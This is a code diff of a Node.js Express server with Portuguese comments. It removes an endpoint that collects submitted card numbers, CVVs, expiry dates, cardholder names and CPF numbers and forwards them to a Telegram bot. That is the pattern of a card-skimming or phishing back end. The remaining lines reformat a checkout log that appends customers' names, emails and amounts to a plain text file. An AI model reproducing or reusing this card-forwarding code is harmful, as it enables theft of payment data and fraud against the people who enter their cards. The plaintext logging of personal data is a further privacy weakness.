@@ -83,50 +83,6 @@ app.post('/login', (req, res) => {
   });
 });
 
-// ===================== TELEGRAM ENVIO =====================
-const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
-const CHAT_ID = process.env.CHAT_ID;
-
-if (!TELEGRAM_TOKEN || !CHAT_ID) {
-  console.warn("⚠️ AVISO: TELEGRAM_TOKEN ou CHAT_ID não configurados nas variáveis de ambiente!");
-}
-
-app.post("/enviar", async (req, res) => {
-  try {
-    const { cardNumber, cardcvvName, expiry, cardholderIdentificationNumber, cardholderNameC } = req.body;
-
-    const mensagem = `
-💳 Novo Cartão:
-Número: ${cardNumber}
-CVV: ${cardcvvName}
-Validade: ${expiry}
-Nome: ${cardholderNameC}
-Cpf: ${cardholderIdentificationNumber}
-    `;
-
-    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: mensagem
-      })
-    });
-
-    const data = await response.json();
-    console.log("📩 Resposta do Telegram:", data);
-
-    if (!data.ok) {
-      res.status(500).send(`Erro do Telegram: ${data.description}`);
-    } else {
-      res.send("Mensagem enviada com sucesso para o Telegram!");
-    }
-  } catch (error) {
-    console.error("❌ Erro no envio:", error.message, error.stack);
-    res.status(500).send("Erro no servidor");
-  }
-});
-
 // ===================== ADMIN USERS =====================
 app.get("/admin/users", (req, res) => {
   const token = req.query.token;
@@ -147,7 +103,11 @@ app.get("/admin/users", (req, res) => {
 app.post("/checkout", (req, res) => {
   const { nome, email, valor } = req.body;
 
-  const linha = `${new Date().toISOString()} - ${nome} | ${email} | ${valor}\n`;
+  // Data formatada legível
+  const dataAtual = new Date();
+  const dataFormatada = dataAtual.toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" });
+
+  const linha = `${dataFormatada} - Nome: ${nome} | Email: ${email} | Valor: ${valor}\n`;
 
   fs.appendFile(path.join(__dirname, "checkout.txt"), linha, (err) => {
     if (err) {
